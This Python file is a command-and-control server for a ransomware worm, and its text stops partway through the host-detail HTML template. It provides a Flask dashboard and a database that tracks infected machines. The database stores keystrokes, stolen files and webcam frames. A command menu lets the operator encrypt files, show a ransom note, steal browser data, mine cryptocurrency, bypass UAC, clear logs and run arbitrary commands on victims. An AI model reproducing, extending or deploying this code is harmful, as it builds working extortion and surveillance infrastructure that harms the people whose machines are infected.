#!/usr/bin/env python3
"""
Complete C2 Server for Cross-Platform Ransomware Worm
All-in-one server with web dashboard and API
"""

import os
import sys
import json
import time
import socket
import base64
import hashlib
import threading
import datetime
import sqlite3
import uuid
import logging
from urllib.parse import parse_qs, urlparse
import subprocess
import shutil
from pathlib import Path
import secrets

try:
    from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
    from flask_socketio import SocketIO, emit
except ImportError:
    print("Installing required packages...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "Flask==2.3.2", "Flask-SocketIO==5.3.4", "python-socketio==5.8.0", "eventlet==0.33.3"])
    from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
    from flask_socketio import SocketIO, emit

# ============================================================
# CONFIGURATION
# ============================================================

C2_HOST = '0.0.0.0'  # Listen on all interfaces
C2_PORT = 5000
C2_DOMAIN = 'localhost'  # Change to your IP or domain
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = 'secure_password_123'  # Change this!
DB_PATH = 'c2_database.db'
LOG_FILE = 'c2_server.log'
SECRET_KEY = secrets.token_hex(32)

# ============================================================
# LOGGING
# ============================================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============================================================
# DATABASE
# ============================================================

class C2Database:
    """Database for C2 server"""
    
    def __init__(self, db_path=DB_PATH):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        """Initialize database tables"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        # Hosts table
        c.execute('''CREATE TABLE IF NOT EXISTS hosts
                     (id TEXT PRIMARY KEY,
                      hostname TEXT,
                      os TEXT,
                      os_version TEXT,
                      architecture TEXT,
                      first_seen TIMESTAMP,
                      last_seen TIMESTAMP,
                      status TEXT,
                      ip TEXT,
                      keylogger_active INTEGER,
                      webcam_available INTEGER,
                      files_encrypted INTEGER,
                      mining_active INTEGER,
                      encrypted_ext TEXT)''')
        
        # Commands table
        c.execute('''CREATE TABLE IF NOT EXISTS commands
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      command TEXT,
                      params TEXT,
                      status TEXT,
                      result TEXT,
                      issued TIMESTAMP,
                      executed TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        # Beacons table
        c.execute('''CREATE TABLE IF NOT EXISTS beacons
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      data TEXT,
                      timestamp TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        # Keylogs table
        c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      key TEXT,
                      timestamp TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        # Encrypted files table
        c.execute('''CREATE TABLE IF NOT EXISTS encrypted_files
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      file_path TEXT,
                      size INTEGER,
                      timestamp TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        # Exfiltrated files table
        c.execute('''CREATE TABLE IF NOT EXISTS exfiltrated_files
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      file_path TEXT,
                      data TEXT,
                      timestamp TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        # Webcam captures table
        c.execute('''CREATE TABLE IF NOT EXISTS webcam_captures
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      frame BLOB,
                      timestamp TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        conn.commit()
        conn.close()
        logger.info("Database initialized")
    
    def add_host(self, data):
        """Add or update host"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('''INSERT OR REPLACE INTO hosts 
                     (id, hostname, os, os_version, architecture, first_seen, last_seen, status, ip,
                      keylogger_active, webcam_available, files_encrypted, mining_active, encrypted_ext)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (data.get('host_id'),
                   data.get('hostname'),
                   data.get('os'),
                   data.get('os_version'),
                   data.get('architecture'),
                   datetime.datetime.now().isoformat(),
                   datetime.datetime.now().isoformat(),
                   'online',
                   data.get('ip'),
                   0, 0, 0, 0,
                   data.get('encrypted_ext', '')))
        
        conn.commit()
        conn.close()
        logger.info(f"Host added/updated: {data.get('host_id')}")
    
    def update_host_status(self, host_id, status, **kwargs):
        """Update host status"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        updates = ['last_seen = ?']
        values = [datetime.datetime.now().isoformat()]
        
        for key, value in kwargs.items():
            updates.append(f"{key} = ?")
            values.append(value)
        
        values.append(host_id)
        query = f"UPDATE hosts SET {', '.join(updates)} WHERE id = ?"
        c.execute(query, values)
        
        conn.commit()
        conn.close()
    
    def add_command(self, host_id, command, params):
        """Add command to queue"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('''INSERT INTO commands (host_id, command, params, status, issued)
                     VALUES (?, ?, ?, ?, ?)''',
                  (host_id, command, json.dumps(params), 'pending',
                   datetime.datetime.now().isoformat()))
        
        command_id = c.lastrowid
        conn.commit()
        conn.close()
        logger.info(f"Command added for {host_id}: {command}")
        return command_id
    
    def get_pending_commands(self, host_id):
        """Get pending commands for host"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('''SELECT id, command, params FROM commands 
                     WHERE host_id = ? AND status = 'pending'
                     ORDER BY issued ASC''', (host_id,))
        
        commands = []
        for row in c.fetchall():
            commands.append({
                'id': row[0],
                'cmd': row[1],
                'params': json.loads(row[2])
            })
        
        conn.close()
        return commands
    
    def update_command_result(self, command_id, result, status='completed'):
        """Update command result"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('''UPDATE commands 
                     SET status = ?, result = ?, executed = ?
                     WHERE id = ?''',
                  (status, json.dumps(result), datetime.datetime.now().isoformat(), command_id))
        
        conn.commit()
        conn.close()
    
    def add_keylog(self, host_id, key):
        """Add keylog entry"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('''INSERT INTO keylogs (host_id, key, timestamp)
                     VALUES (?, ?, ?)''',
                  (host_id, key, datetime.datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
    
    def add_encrypted_file(self, host_id, file_path, size):
        """Add encrypted file entry"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('''INSERT INTO encrypted_files (host_id, file_path, size, timestamp)
                     VALUES (?, ?, ?, ?)''',
                  (host_id, file_path, size, datetime.datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
    
    def add_exfiltrated_file(self, host_id, file_path, data):
        """Add exfiltrated file"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('''INSERT INTO exfiltrated_files (host_id, file_path, data, timestamp)
                     VALUES (?, ?, ?, ?)''',
                  (host_id, file_path, data, datetime.datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
    
    def get_hosts(self):
        """Get all hosts"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('SELECT * FROM hosts ORDER BY last_seen DESC')
        hosts = []
        for row in c.fetchall():
            # Get counts
            c2 = conn.cursor()
            c2.execute('SELECT COUNT(*) FROM keylogs WHERE host_id = ?', (row[0],))
            keylog_count = c2.fetchone()[0]
            
            c2.execute('SELECT COUNT(*) FROM encrypted_files WHERE host_id = ?', (row[0],))
            encrypted_count = c2.fetchone()[0]
            
            c2.execute('SELECT COUNT(*) FROM exfiltrated_files WHERE host_id = ?', (row[0],))
            exfiltrated_count = c2.fetchone()[0]
            
            hosts.append({
                'id': row[0],
                'hostname': row[1],
                'os': row[2],
                'os_version': row[3],
                'architecture': row[4],
                'first_seen': row[5],
                'last_seen': row[6],
                'status': row[7],
                'ip': row[8],
                'keylogger_active': bool(row[9]),
                'webcam_available': bool(row[10]),
                'files_encrypted': bool(row[11]),
                'mining_active': bool(row[12]),
                'encrypted_ext': row[13] or '',
                'keylog_count': keylog_count,
                'encrypted_count': encrypted_count,
                'exfiltrated_count': exfiltrated_count
            })
        
        conn.close()
        return hosts
    
    def get_host(self, host_id):
        """Get host by ID"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('SELECT * FROM hosts WHERE id = ?', (host_id,))
        row = c.fetchone()
        
        if row:
            host = {
                'id': row[0],
                'hostname': row[1],
                'os': row[2],
                'os_version': row[3],
                'architecture': row[4],
                'first_seen': row[5],
                'last_seen': row[6],
                'status': row[7],
                'ip': row[8],
                'keylogger_active': bool(row[9]),
                'webcam_available': bool(row[10]),
                'files_encrypted': bool(row[11]),
                'mining_active': bool(row[12]),
                'encrypted_ext': row[13] or ''
            }
            
            # Get command history
            c.execute('''SELECT command, status, issued, executed FROM commands 
                         WHERE host_id = ? ORDER BY issued DESC LIMIT 10''', (host_id,))
            host['commands'] = []
            for cmd_row in c.fetchall():
                host['commands'].append({
                    'command': cmd_row[0],
                    'status': cmd_row[1],
                    'issued': cmd_row[2],
                    'executed': cmd_row[3]
                })
            
            # Get counts
            c.execute('SELECT COUNT(*) FROM keylogs WHERE host_id = ?', (host_id,))
            host['keylog_count'] = c.fetchone()[0]
            
            c.execute('SELECT COUNT(*) FROM encrypted_files WHERE host_id = ?', (host_id,))
            host['encrypted_count'] = c.fetchone()[0]
            
            c.execute('SELECT COUNT(*) FROM exfiltrated_files WHERE host_id = ?', (host_id,))
            host['exfiltrated_count'] = c.fetchone()[0]
        
        conn.close()
        return host
    
    def get_beacons(self, host_id=None, limit=100):
        """Get beacons"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        if host_id:
            c.execute('SELECT data, timestamp FROM beacons WHERE host_id = ? ORDER BY timestamp DESC LIMIT ?', 
                     (host_id, limit))
        else:
            c.execute('SELECT data, timestamp FROM beacons ORDER BY timestamp DESC LIMIT ?', (limit,))
        
        beacons = []
        for row in c.fetchall():
            beacons.append({
                'data': json.loads(row[0]),
                'timestamp': row[1]
            })
        
        conn.close()
        return beacons

# ============================================================
# DNS C2 SERVER (for DNS-based C2)
# ============================================================

class DNSC2Server:
    """DNS-based C2 server"""
    
    def __init__(self, db, domain=C2_DOMAIN):
        self.db = db
        self.domain = domain
        self.commands = {}
        self.running = False
    
    def start(self):
        """Start DNS server (simplified)"""
        self.running = True
        threading.Thread(target=self._dns_listener, daemon=True).start()
        logger.info("DNS C2 server started")
    
    def _dns_listener(self):
        """Simulated DNS listener"""
        while self.running:
            time.sleep(1)
    
    def add_command_for_host(self, host_id, command):
        """Add command for host via DNS"""
        encoded = base64.b64encode(json.dumps(command).encode()).decode()
        self.commands[host_id] = encoded
        logger.info(f"DNS command ready for {host_id}")
    
    def get_command_for_host(self, host_id):
        """Get command for host"""
        command = self.commands.get(host_id)
        if command:
            del self.commands[host_id]
            return json.loads(base64.b64decode(command).decode())
        return None

# ============================================================
# HTML TEMPLATES
# ============================================================

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server - Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .login-container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            padding: 50px;
            border-radius: 24px;
            width: 380px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .login-container .logo {
            text-align: center;
            font-size: 48px;
            margin-bottom: 10px;
        }
        .login-container h1 {
            text-align: center;
            margin-bottom: 30px;
            font-weight: 300;
            letter-spacing: 2px;
        }
        .login-container h1 span { color: #ff6b35; }
        .login-container input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            background: rgba(255,255,255,0.05);
            color: white;
            font-size: 15px;
            transition: 0.3s;
        }
        .login-container input:focus {
            outline: none;
            border-color: #ff6b35;
            background: rgba(255,255,255,0.1);
        }
        .login-container input::placeholder {
            color: rgba(255,255,255,0.3);
        }
        .login-container button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #ff6b35, #e55a2b);
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            transition: 0.3s;
            letter-spacing: 1px;
        }
        .login-container button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(255,107,53,0.3);
        }
        .error {
            color: #ff4444;
            text-align: center;
            margin-top: 12px;
            font-size: 14px;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.3);
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🕵️</div>
        <h1>C2 <span>Server</span></h1>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}
        <div class="footer">v2.0 • Secure Command & Control</div>
    </div>
</body>
</html>
'''

DASHBOARD_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server - Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0a0a1a;
            color: #fff;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            padding: 24px 30px;
            border-radius: 16px;
            margin-bottom: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .header-left h1 {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 1px;
        }
        .header-left h1 span { color: #ff6b35; }
        .header-left .subtitle {
            color: #888;
            font-size: 13px;
            margin-top: 4px;
        }
        .header-right {
            display: flex;
            gap: 30px;
            align-items: center;
        }
        .stat-item {
            text-align: center;
        }
        .stat-item .number {
            font-size: 26px;
            font-weight: 700;
        }
        .stat-item .label {
            font-size: 11px;
            color: #888;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .stat-item .number.online { color: #00ff88; }
        .stat-item .number.offline { color: #ff4444; }
        .stat-item .number.warning { color: #ffaa00; }
        .stat-item .number.primary { color: #ff6b35; }
        .nav-links {
            display: flex;
            gap: 15px;
            align-items: center;
        }
        .nav-links a {
            color: #888;
            text-decoration: none;
            font-size: 14px;
            transition: 0.3s;
            padding: 8px 14px;
            border-radius: 8px;
        }
        .nav-links a:hover {
            color: #fff;
            background: rgba(255,255,255,0.05);
        }
        .nav-links .logout {
            color: #ff4444;
        }
        .nav-links .logout:hover {
            background: rgba(255,68,68,0.1);
        }
        .hosts-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 20px;
        }
        .host-card {
            background: rgba(255,255,255,0.03);
            border-radius: 16px;
            padding: 20px;
            transition: 0.3s;
            cursor: pointer;
            border: 1px solid rgba(255,255,255,0.06);
            position: relative;
            overflow: hidden;
        }
        .host-card:hover {
            transform: translateY(-4px);
            border-color: #ff6b35;
            box-shadow: 0 10px 40px rgba(255,107,53,0.1);
        }
        .host-card .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 6px;
        }
        .host-card .status-dot.online { background: #00ff88; }
        .host-card .status-dot.offline { background: #ff4444; }
        .host-card .hostname {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .host-card .info {
            font-size: 13px;
            color: #aaa;
            margin: 4px 0;
        }
        .host-card .info span {
            margin-right: 16px;
        }
        .host-card .badges {
            margin-top: 10px;
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }
        .badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .badge-success { background: rgba(0,255,136,0.15); color: #00ff88; }
        .badge-warning { background: rgba(255,170,0,0.15); color: #ffaa00; }
        .badge-danger { background: rgba(255,68,68,0.15); color: #ff4444; }
        .badge-info { background: rgba(100,149,237,0.15); color: #6495ed; }
        .badge-purple { background: rgba(155,89,182,0.15); color: #9b59b6; }
        .timestamp {
            font-size: 11px;
            color: #555;
            margin-top: 8px;
            display: block;
        }
        .no-hosts {
            text-align: center;
            padding: 80px 20px;
            color: #666;
        }
        .no-hosts .icon { font-size: 64px; margin-bottom: 20px; }
        .no-hosts .title { font-size: 22px; margin-bottom: 8px; }
        .no-hosts .sub { font-size: 14px; color: #444; }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: #1a1a2e;
            border-radius: 20px;
            padding: 35px;
            width: 90%;
            max-width: 650px;
            max-height: 85vh;
            overflow-y: auto;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .modal-content h2 {
            color: #ff6b35;
            margin-bottom: 20px;
            font-weight: 600;
        }
        .modal-content .selected-host {
            color: #888;
            font-size: 14px;
            margin-bottom: 16px;
            padding: 8px 12px;
            background: rgba(255,255,255,0.05);
            border-radius: 8px;
        }
        .modal-content select,
        .modal-content input,
        .modal-content textarea {
            width: 100%;
            padding: 12px 14px;
            margin: 8px 0;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 10px;
            color: white;
            font-size: 14px;
            transition: 0.3s;
        }
        .modal-content select:focus,
        .modal-content input:focus,
        .modal-content textarea:focus {
            outline: none;
            border-color: #ff6b35;
        }
        .modal-content select option {
            background: #1a1a2e;
        }
        .modal-content textarea {
            min-height: 80px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            resize: vertical;
        }
        .modal-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        .modal-buttons button {
            padding: 12px 28px;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }
        .modal-buttons .send-btn {
            background: linear-gradient(135deg, #ff6b35, #e55a2b);
            color: white;
        }
        .modal-buttons .send-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(255,107,53,0.3);
        }
        .modal-buttons .close-btn {
            background: #444;
            color: white;
        }
        .modal-buttons .close-btn:hover {
            background: #555;
        }
        
        /* Notification */
        .notification {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: #1a1a2e;
            color: white;
            padding: 16px 24px;
            border-radius: 12px;
            border-left: 4px solid #ff6b35;
            z-index: 2000;
            animation: slideIn 0.3s ease;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        @media (max-width: 768px) {
            .header { flex-direction: column; gap: 16px; }
            .header-right { flex-wrap: wrap; justify-content: center; }
            .hosts-grid { grid-template-columns: 1fr; }
            .modal-content { padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-left">
            <h1>🕵️ <span>C2</span> Server</h1>
            <div class="subtitle">Command & Control • <span id="lastUpdate">-</span></div>
        </div>
        <div class="header-right">
            <div class="stat-item">
                <div class="number primary" id="totalHosts">{{ stats.total_hosts }}</div>
                <div class="label">Total</div>
            </div>
            <div class="stat-item">
                <div class="number online" id="onlineHosts">{{ stats.online_hosts }}</div>
                <div class="label">Online</div>
            </div>
            <div class="stat-item">
                <div class="number warning" id="keyloggerCount">{{ stats.keylogger_active }}</div>
                <div class="label">Keyloggers</div>
            </div>
            <div class="stat-item">
                <div class="number primary" id="miningCount">{{ stats.mining_active }}</div>
                <div class="label">Miners</div>
            </div>
            <div class="nav-links">
                <a href="#" onclick="refreshHosts()">🔄 Refresh</a>
                <a href="{{ url_for('logout') }}" class="logout">🚪 Logout</a>
            </div>
        </div>
    </div>

    <div class="hosts-grid" id="hostsGrid">
        {% if hosts %}
            {% for host in hosts %}
            <div class="host-card" onclick="selectHost('{{ host.id }}')">
                <div>
                    <span class="status-dot {{ host.status }}"></span>
                    <span class="hostname">{{ host.hostname }}</span>
                </div>
                <div class="info">
                    <span>🖥️ {{ host.os or 'unknown' }}</span>
                    <span>🏷️ {{ host.id[:8] }}</span>
                </div>
                <div class="info">
                    <span>📁 {{ host.encrypted_count|default(0) }} encrypted</span>
                    <span>⌨️ {{ host.keylog_count|default(0) }} keys</span>
                    <span>📤 {{ host.exfiltrated_count|default(0) }} exfil</span>
                </div>
                <div class="badges">
                    {% if host.keylogger_active %}
                        <span class="badge badge-success">⌨️ Keylogger</span>
                    {% endif %}
                    {% if host.mining_active %}
                        <span class="badge badge-warning">⛏️ Mining</span>
                    {% endif %}
                    {% if host.webcam_available %}
                        <span class="badge badge-info">📷 Webcam</span>
                    {% endif %}
                    {% if host.files_encrypted %}
                        <span class="badge badge-danger">🔒 Encrypted</span>
                    {% endif %}
                    {% if host.encrypted_ext %}
                        <span class="badge badge-purple">{{ host.encrypted_ext }}</span>
                    {% endif %}
                </div>
                <span class="timestamp">Last seen: {{ host.last_seen[:19] if host.last_seen else '-' }}</span>
            </div>
            {% endfor %}
        {% else %}
            <div class="no-hosts" style="grid-column: 1 / -1;">
                <div class="icon">📡</div>
                <div class="title">No hosts connected</div>
                <div class="sub">Waiting for beacons from infected machines...</div>
            </div>
        {% endif %}
    </div>

    <!-- Command Modal -->
    <div class="modal" id="commandModal">
        <div class="modal-content">
            <h2>📨 Send Command</h2>
            <div class="selected-host" id="selectedHost">Selected: None</div>
            
            <select id="commandSelect" onchange="updateCommandParams()">
                <option value="">Select Command...</option>
                <option value="status">📊 Status</option>
                <option value="encrypt">🔒 Encrypt All</option>
                <option value="encrypt_files">📁 Encrypt Specific Files</option>
                <option value="encrypt_directory">📂 Encrypt Directory</option>
                <option value="decrypt">🔓 Decrypt All</option>
                <option value="decrypt_files">📁 Decrypt Specific Files</option>
                <option value="decrypt_directory">📂 Decrypt Directory</option>
                <option value="keylog_start">⌨️ Start Keylogger</option>
                <option value="keylog_stop">⌨️ Stop Keylogger</option>
                <option value="webcam_capture">📷 Capture Webcam</option>
                <option value="webcam_stream">📷 Stream Webcam</option>
                <option value="screenshot">🖼️ Screenshot</option>
                <option value="execute">⚡ Execute Command</option>
                <option value="exfiltrate">📤 Exfiltrate Files</option>
                <option value="steal_browser">🌐 Steal Browser Data</option>
                <option value="start_mining">⛏️ Start Mining</option>
                <option value="stop_mining">⛏️ Stop Mining</option>
                <option value="display_ransom_note">📋 Ransom Note</option>
                <option value="block_computer">🔒 Block Computer</option>
                <option value="clear_logs">🧹 Clear Logs</option>
                <option value="bypass_uac">⬆️ Bypass UAC</option>
                <option value="self_destruct">💣 Self Destruct</option>
            </select>
            
            <div id="commandParams">
                <textarea id="paramsInput" placeholder="Command parameters (JSON)" rows="4">{}</textarea>
            </div>
            
            <div class="modal-buttons">
                <button class="send-btn" onclick="sendCommand()">🚀 Send Command</button>
                <button class="close-btn" onclick="closeModal()">❌ Cancel</button>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let selectedHostId = null;
        let commandTemplates = {};

        // Load command templates
        fetch('/api/command_templates')
            .then(r => r.json())
            .then(data => {
                commandTemplates = data;
                updateCommandParams();
            })
            .catch(() => {
                // Use default templates if API fails
                commandTemplates = {
                    'status': { params: {} },
                    'encrypt': { params: {'password': ''} },
                    'encrypt_files': { params: {'file_paths': ['/path/to/file.txt'], 'password': ''} },
                    'encrypt_directory': { params: {'directory': '/path/to/dir', 'password': '', 'recursive': true} },
                    'decrypt': { params: {'password': ''} },
                    'decrypt_files': { params: {'file_paths': ['/path/to/file.txt.encrypted'], 'password': ''} },
                    'keylog_start': { params: {'duration': 60} },
                    'keylog_stop': { params: {} },
                    'webcam_capture': { params: {} },
                    'webcam_stream': { params: {'duration': 10, 'frame_rate': 5} },
                    'screenshot': { params: {} },
                    'execute': { params: {'command': 'whoami'} },
                    'exfiltrate': { params: {'max_files': 50} },
                    'start_mining': { params: {'wallet_address': ''} },
                    'stop_mining': { params: {} },
                    'display_ransom_note': { params: {} },
                    'block_computer': { params: {'action': 'lock'} },
                    'self_destruct': { params: {'confirm': true} },
                    'clear_logs': { params: {} },
                    'bypass_uac': { params: {} }
                };
            });

        socket.on('connect', () => {
            console.log('Connected to WebSocket');
        });

        socket.on('beacon', (data) => {
            console.log('Beacon received:', data);
            refreshHosts();
        });

        socket.on('command_result', (data) => {
            console.log('Command result:', data);
            showNotification('✅ Command result received');
        });

        function refreshHosts() {
            fetch('/api/hosts')
                .then(r => r.json())
                .then(hosts => {
                    const grid = document.getElementById('hostsGrid');
                    if (hosts.length === 0) {
                        grid.innerHTML = `
                            <div class="no-hosts" style="grid-column: 1 / -1;">
                                <div class="icon">📡</div>
                                <div class="title">No hosts connected</div>
                                <div class="sub">Waiting for beacons from infected machines...</div>
                            </div>
                        `;
                        return;
                    }
                    
                    grid.innerHTML = hosts.map(host => `
                        <div class="host-card" onclick="selectHost('${host.id}')">
                            <div>
                                <span class="status-dot ${host.status}"></span>
                                <span class="hostname">${host.hostname || 'Unknown'}</span>
                            </div>
                            <div class="info">
                                <span>🖥️ ${host.os || 'unknown'}</span>
                                <span>🏷️ ${host.id ? host.id.slice(0,8) : ''}</span>
                            </div>
                            <div class="info">
                                <span>📁 ${host.encrypted_count || 0} encrypted</span>
                                <span>⌨️ ${host.keylog_count || 0} keys</span>
                                <span>📤 ${host.exfiltrated_count || 0} exfil</span>
                            </div>
                            <div class="badges">
                                ${host.keylogger_active ? '<span class="badge badge-success">⌨️ Keylogger</span>' : ''}
                                ${host.mining_active ? '<span class="badge badge-warning">⛏️ Mining</span>' : ''}
                                ${host.webcam_available ? '<span class="badge badge-info">📷 Webcam</span>' : ''}
                                ${host.files_encrypted ? '<span class="badge badge-danger">🔒 Encrypted</span>' : ''}
                                ${host.encrypted_ext ? `<span class="badge badge-purple">${host.encrypted_ext}</span>` : ''}
                            </div>
                            <span class="timestamp">Last seen: ${host.last_seen ? host.last_seen.slice(0,19) : '-'}</span>
                        </div>
                    `).join('');
                    
                    // Update stats
                    const online = hosts.filter(h => h.status === 'online').length;
                    const keyloggers = hosts.filter(h => h.keylogger_active).length;
                    const miners = hosts.filter(h => h.mining_active).length;
                    
                    document.getElementById('totalHosts').textContent = hosts.length;
                    document.getElementById('onlineHosts').textContent = online;
                    document.getElementById('keyloggerCount').textContent = keyloggers;
                    document.getElementById('miningCount').textContent = miners;
                    document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
                })
                .catch(error => {
                    console.error('Error fetching hosts:', error);
                });
        }

        function selectHost(hostId) {
            selectedHostId = hostId;
            document.getElementById('selectedHost').textContent = `Selected: ${hostId}`;
            document.getElementById('commandModal').classList.add('active');
        }

        function closeModal() {
            document.getElementById('commandModal').classList.remove('active');
        }

        function updateCommandParams() {
            const cmd = document.getElementById('commandSelect').value;
            const template = commandTemplates[cmd];
            
            if (template && template.params) {
                document.getElementById('paramsInput').value = JSON.stringify(template.params, null, 2);
            } else {
                document.getElementById('paramsInput').value = '{}';
            }
        }

        function sendCommand() {
            if (!selectedHostId) {
                alert('No host selected');
                return;
            }
            
            const command = document.getElementById('commandSelect').value;
            if (!command) {
                alert('Please select a command');
                return;
            }
            
            let params;
            try {
                params = JSON.parse(document.getElementById('paramsInput').value);
            } catch (e) {
                alert('Invalid JSON parameters');
                return;
            }
            
            const data = {
                host_id: selectedHostId,
                command: command,
                params: params
            };
            
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(r => r.json())
            .then(response => {
                if (response.success) {
                    showNotification('✅ Command sent successfully');
                    closeModal();
                } else {
                    alert('Error: ' + (response.message || 'Unknown error'));
                }
            })
            .catch(error => {
                alert('Error: ' + error);
            });
        }

        function showNotification(message) {
            const existing = document.querySelector('.notification');
            if (existing) existing.remove();
            
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.textContent = message;
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.opacity = '0';
                notification.style.transition = 'opacity 0.3s';
                setTimeout(() => notification.remove(), 300);
            }, 3000);
        }

        // Refresh every 10 seconds
        setInterval(refreshHosts, 10000);
        refreshHosts();

        // Close modal on escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeModal();
        });
    </script>
</body>
</html>
'''

HOST_DETAIL_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server - Host Details</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
